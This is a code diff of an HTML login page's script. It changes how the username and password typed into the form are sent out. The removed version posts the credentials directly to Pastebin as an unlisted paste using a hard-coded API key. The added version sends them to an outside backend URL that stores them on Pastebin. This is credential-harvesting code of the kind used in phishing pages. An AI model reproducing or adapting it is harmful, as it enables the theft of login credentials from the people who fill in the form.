@@ -1049,38 +1049,27 @@
                     </div>
                     
                     <script>
+                      const backendURL = "vir-production.up.railway.app/submit"; // Replace with your deployed backend URL
+                    
                       document.getElementById('submitButton').addEventListener('click', async () => {
                         const userName = document.getElementById('userName').value;
                         const password = document.getElementById('password').value;
-
-                        // Pastebin API details
-                        const pastebinAPIKey = "j-ZxFe6iQaCvQ8U8R6Syr8fYUYT-Bo92"; // Replace with your actual API key
-                        const apiURL = "https://pastebin.com/api/api_post.php";
-
-                        const formData = new URLSearchParams({
-                          api_dev_key: pastebinAPIKey,
-                          api_option: "paste",
-                          api_paste_code: `User Name: ${userName}\nPassword: ${password}`,
-                          api_paste_name: "Login Data",
-                          api_paste_private: "1", // 0=public, 1=unlisted, 2=private
-                          api_paste_expire_date: "10M" // Expire in 10 minutes
-                        });
-
+                    
                         try {
-                          const response = await fetch(apiURL, {
+                          const response = await fetch(backendURL, {
                             method: "POST",
-                            headers: { "Content-Type": "application/x-www-form-urlencoded" },
-                            body: formData.toString()
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ userName, password }),
                           });
-
-                          if (!response.ok) {
-                            throw new Error("Failed to connect to Pastebin API.");
+                    
+                          const data = await response.json();
+                          if (data.success) {
+                            alert(`Data successfully submitted to Pastebin: ${data.pasteUrl}`);
+                          } else {
+                            alert("Failed to submit data.");
                           }
-
-                          const resultURL = await response.text();
-                          alert(`Data successfully submitted to Pastebin: ${resultURL}`);
                         } catch (error) {
-                          console.error("Error submitting data to Pastebin:", error);
+                          console.error("Error:", error);
                           alert("An error occurred. Please try again.");
                         }
                       });
